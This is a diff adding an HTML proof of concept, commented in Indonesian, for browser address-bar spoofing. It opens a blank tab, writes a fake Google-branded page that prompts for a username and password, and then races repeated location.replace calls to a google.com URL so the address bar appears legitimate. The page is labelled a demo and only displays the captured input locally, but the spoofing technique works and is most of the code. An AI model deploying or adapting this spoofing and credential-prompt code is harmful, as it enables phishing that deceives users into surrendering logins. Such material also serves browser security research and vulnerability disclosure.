@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+  // buka tab kosong (same-origin) supaya bisa diisi konten sendiri
+  const win = window.open("", "_blank");
+  if (!win) return;
+
+  // payload + DEMO prompt (tidak mengirim ke mana pun)
+  const payload = `
+    <div style="text-align:center; font-family:Arial, sans-serif;">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
+           alt="Google Logo" style="margin-top:20px;">
+      <h1>THIS IS A DEMO — NOT GOOGLE</h1>
+      <p>Demo only — jangan masukkan kredensial asli. Input tidak dikirim ke mana pun.</p>
+
+      <script>
+        (function(){
+          try{
+            var u = prompt('DEMO ONLY — enter fake username:');
+            var p = prompt('DEMO ONLY — enter fake password:');
+
+            // tampilkan hasil DEMO di halaman (lokal, bukan kirim)
+            var box = document.createElement('pre');
+            box.textContent =
+              'DEMO capture (not transmitted)\\n' +
+              'Username: ' + u + '\\n' +
+              'Password: ' + p;
+            box.style.cssText =
+              'text-align:left;max-width:520px;margin:16px auto;' +
+              'border:1px dashed #999;padding:10px;border-radius:8px;white-space:pre-wrap';
+            document.body.appendChild(box);
+          }catch(e){}
+        })();
+      <\/script>
+    </div>
+  `;
+
+  win.document.write(payload);
+  win.document.close();
+
+  // kasih waktu sedikit supaya prompt muncul, lalu jalankan race agar address bar coba tetap "google.com"
+  win.setTimeout(function(){
+    var timer = win.setInterval(function(){
+      try { win.location.replace('https://www.google.com:8080'); } catch(e) {}
+    }, 25); // 10ms bisa terlalu agresif & menghalangi prompt; 25ms biasanya cukup
+    // otomatis berhenti setelah 6 detik biar nggak runaway
+    win.setTimeout(function(){ clearInterval(timer); }, 6000);
+  }, 200);
+}
+</script>
+</body>
+</html>
